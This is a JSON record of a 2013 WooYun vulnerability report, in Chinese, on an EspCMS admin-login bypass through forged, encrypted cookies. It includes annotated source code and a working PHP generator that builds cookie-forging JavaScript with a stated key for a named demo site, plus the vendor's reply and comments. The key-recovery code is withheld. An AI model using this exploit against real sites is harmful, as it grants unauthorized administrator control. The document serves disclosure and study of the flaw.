{"id": 12325, "wybug_id": "wooyun-2013-022517", "wybug_title": "EspCMS 后台登录绕过漏洞再利用(再利用！)", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "c4rp3nt3r", "wybug_date": "2013-04-25 18:31", "wybug_open_date": "2013-06-09 18:31", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "认证设计不合理", "源码审核", "未授权访问", "白盒测试", "越权操作"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-09：\t细节向公众公开  简要描述： 声明下，此漏洞0413提交到360漏洞平台，之后0422官方修复了该漏洞。现在提交到wooyun是绕过官方修复的方法，继续利用。可以算是老漏洞提死回生，不应该算是同一个漏洞提交到两个地方，希望有关部门能够明白，尽管代码非常像。 详细说明：  之前4月13日在360的漏洞平台提交过一次，当时给出了能计算出db_pscode的利用工具。db_pscode是安装的时候随机生成的一个字符串常量，保存在配置文件里。4月22日，官方发布了新版本，改进了程序安装时候生成db_pscode的方法，\"修复了\"该漏洞。其实官方只是防住了当时的那个exp，并没有从根本上防住漏洞。22日之前是32位的md5hash字符串，这次长度变的不固定可以是1-39位的字符串，但是依然可以逆向出来,这里还是以后台绕过的方法来利用这个漏洞。先看一下EspCMS后台的验证流程管理的主界面important类的构造函数：\n<?php//adminsoft/management.phpclass important extends connector {\tfunction important() {\t\t$this->softbase(true);\t//构造函数调用了父类中的softbase函数，softbase函数又调用了admin_purview函数来验证登录状态\t}---//父类 connector中的softbase函数// public/class_connector.phpclass connector {\tfunction softbase($admin_purview = false) {\t\theader(\"Content-Type: text/html; charset=utf-8\");\t\t$this->dbmysql();\t\t$this->commandinc();\t\t$this->systemfile();\t\t$this->cachedb();\t\tif ($admin_purview) {\t\t\t$this->admin_purview();\t\t//这里会验证管理员是否已经登录\t\t\t$this->sitelng = $this->getlng();\t\t\t$action = $this->fun->accept('action', 'R');\t\t\t\tif (in_array($action, $this->esp_powerlist) && !in_array('all', $this->esp_powerlist)) {\t\t\t\texit('Permissions errors');\t\t//$this->esp_powerlist权限列表 这里设置成all就ok了\t\t\t}\t\t}.....// public/class_connector.php\tfunction admin_purview() {\t\tif ($this->fun->accept('archive', 'R') == 'filemanage' && $this->fun->accept('action', 'R') == 'batupfilesave') {\t\t\t$ecisp_admininfo = $this->fun->accept('ecisp_admininfo', 'G');\t\t\t$esp_powerlist = $this->fun->accept('esp_powerlist', 'G');\t\t\t$gettype = false;\t\t} else {\t\t\t$ecisp_admininfo = $this->fun->accept('ecisp_admininfo', 'C');\t\t\t$esp_powerlist = $this->fun->accept('esp_powerlist', 'C');\t\t\t$gettype = true;\t\t//上面的两个数据可以从 cookie 和get的参数中获取 \t\t\t\t\t\t\t\t\t//我们还是直接从cookie入手吧，一是隐蔽啊，来无影去无踪，二是能保存参数值\t\t\t\t\t\t\t\t\t//$esp_powerlist 是权限列表 我们让这里 解码后是 all 也就是拥有所有权限的管理员\t\t\t\t\t\t\t\t\t//$ecisp_admininfo保存着管理员的一些信息\t\t}\t\t\t\t//下面的db_pscode 我们已经能够控制了，$ecisp_admininfo我们可以自己构造，进一步控制 $arr_purview 和 $this->esp_powerlist\t\t$arr_purview = explode('|', $this->fun->eccode($ecisp_admininfo, 'DECODE', db_pscode));\t\t$this->esp_powerlist = explode('|', $this->fun->eccode($esp_powerlist, 'DECODE', db_pscode));\t\t// \"1|c4rp3nt3r|12345678901234567890123456789012|md5('Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101') |1|management|\".ms5('http://scan.hackme.info/espcms/adminsoft/');\t\tlist($this->esp_adminuserid, $this->esp_username, $this->esp_password, $this->esp_useragent, $this->esp_powerid, $this->esp_inputclassid, $this->esp_softurl) = $arr_purview;\t\tif ($gettype) {\t\t\t//cookie提交的参数 程序就进到这里 只要满足下面的条件 使 $condition = 1; 那么就通过了管理员验证\t\t\t//这里的问题是所有数据没有再一次进入到数据库验证(如果验证的话估计会产生SQL注入：)\t\t\t//我们构造 $this->esp_username = 'c4rp3nt3r'; $this->esp_adminuserid = '1';$this->esp_softurl是后台地址已知的\t\t\tif (empty($this->esp_username) || empty($this->esp_adminuserid) || md5(admin_AGENT) != $this->esp_useragent || md5(admin_ClassURL) != $this->esp_softurl) {\t\t\t\t$condition = 0;\t\t\t} else {\t\t\t\t$condition = 1;\t\t\t}\t\t} else {\t\t\t\t\t\t\t\tif (empty($this->esp_username) || empty($this->esp_adminuserid) || md5(admin_ClassURL) != $this->esp_softurl) {\t\t\t\t$condition = 0;\t\t\t} else {\t\t\t\t$condition = 1;\t\t\t}\t\t}\t\tif ($condition == 0) {\t\t\tif ($this->fun->accept('archive', 'R') != 'adminuser' && $this->fun->accept('action', 'R') != 'login') {\t\t\t\theader('location: index.php?archive=adminuser&action=login');\t\t\t\texit();\t\t\t}\t\t} else {\t//通过了管理员验证 :-)\t\t\tif ($condition == 1 && $this->fun->accept('point', 'R') == '' && $this->fun->accept('archive', 'R') == '' && $this->fun->accept('action', 'R') == '') {\t\t\t\theader('location: index.php?archive=management&action=tab&loadfun=mangercenter&out=tabcenter');\t\t\t\texit();\t\t\t}\t\t}\t}\n这里关键是 $this->fun->eccode() 这个函数的解密密钥 db_pscode 的获取了。通过对比明文和密文可以逆向出这个值：为了不必要的误会和麻烦，这里就不给出计算db_pscode的具体代码了。说下方法吧：通过useragent 和 网站根目录网址就能逆向出超过66位的字符串值。0422后db_pscode长度如果在32位之内也可以通过别的地方如发送验证邮件的地方获得32位的验证码。总之N多方法。这里直接给出后台绕过的javascript利用代码的生成代码：\n<?php// code by c4rp3nt3r@0x50sec.org$admin_AGENT = $_SERVER['HTTP_USER_AGENT'];//////////////////////////////////////////////////////////////////////$admin_ClassURL = 'http://demo.ecisp.cn/adminsoft';$key = \"b229c152dsafsdafasfsadfasfdsfcbda220a9c5\";\t// http://demo.ecisp.cn 这个网站的 db_pscode (20130425)//////////////////////////////////////////////////////////////////////$powerlist = 'all';$admininfo = '1|espcmsadmin|cccccccccccccccccccccccccccccccc|'.md5($admin_AGENT).'|1|1|'.md5($admin_ClassURL);$esp_powerlist = eccode($powerlist ,'ENCODE', $key);$ecisp_admininfo = eccode($admininfo, 'ENCODE', $key);$exploit = '';$exploit = \"document.cookie='esp_powerlist=$esp_powerlist';\\n\";\t$exploit .= \"document.cookie='ecisp_admininfo=$ecisp_admininfo';\\n\";$exploit .= \"//alert(document.cookie);\\n\";$exploit .= \"window.location.href='\".$admin_ClassURL.\"/index.php?archive=management&action=tab&loadfun=mangercenter&out=tabcenter'; \\n\";\techo \"<pre>\".$exploit.\"</pre>\";function eccode($string, $operation = 'DECODE', $key = '@LFK24s224%@safS3s%1f%') {\t\t$result = '';\t\t//echo '^'.$key.\"^\\n\";\t\tif ($operation == 'ENCODE') {\t\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t\t$char = substr($string, $i, 1);\t\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t\t$char = chr(ord($char) + ord($keychar));\t\t\t\t$result.=$char;\t\t\t}\t\t\t$result = base64_encode($result);\t\t\t$result = str_replace(array('+', '/', '='), array('-', '_', ''), $result);\t\t} elseif ($operation == 'DECODE') {\t\t\t$data = str_replace(array('-', '_'), array('+', '/'), $string);\t\t\t$mod4 = strlen($data) % 4;\t\t\tif ($mod4) {\t\t\t\t$data .= substr('====', $mod4);\t\t\t}\t\t\t$string = base64_decode($data);\t\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t\t$char = substr($string, $i, 1);\t\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t\t$char = chr(ord($char) - ord($keychar));\t\t\t\t$result.=$char;\t\t\t}\t\t}\t\treturn $result;\t}\n   漏洞证明：  \n\n   修复方案：  呵呵我是来支持wooyun的   版权声明：转载请注明来源 c4rp3nt3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-04-25 20:03 厂商回复： 感谢！真是强中自有强中手，一山更比一山高啊！！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-25 18:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  顶啊顶啊    \n     2013-04-25 19:43 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  顶啊顶啊    \n     2013-04-25 23:00 |    \t\t陈再胜 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:13        | 微博收收听~~~●﹏●)\t\t \n  @疯狗 @xsser 我是破坏队形的，楼上两个捣蛋王····又想起哄    \n     2013-04-26 15:00 |    \t\t小乐天 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:12        | From KnownSec)\t\t \n  exp贴出来呗    \n     2013-05-26 01:44 |    \t\t春哥 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | xxxxx)\t\t \n  队形继续顶啊顶啊    \n     2013-06-09 19:37 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:81        | 三人行必有我师焉########################...)\t\t \n  顶啊顶啊     \n     2013-06-09 20:50 |    \t\t纠结师 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:12        | 传说中的废材)\t\t \n  顶啊顶啊    \n     2014-05-07 00:10 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n   思路很棒 学习了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}